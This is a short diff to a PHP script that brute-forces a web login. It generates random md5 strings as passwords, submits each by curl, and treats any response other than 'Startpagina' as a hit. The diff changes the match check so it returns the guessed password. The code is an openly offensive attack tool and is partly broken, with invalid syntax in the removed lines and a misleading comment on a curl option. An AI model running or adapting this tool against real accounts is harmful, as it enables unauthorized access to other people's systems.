@@ -16,9 +16,7 @@ while(True)
 {     
 	$Pass = md5(rand(0, 1000000));
 
-	check_correct($Pass) {
-	echo('FOUND MATCH, password: '.$Pass.);
-     }
+	check_correct($Pass);
    }
 }
 function check_correct($Pass)
@@ -34,7 +32,7 @@ function check_correct($Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str != "Startpagina") {return true;}
+	if($str != "Startpagina") {return $Pass;}
         else {return false;}
 }
 bruteForce($Pass);
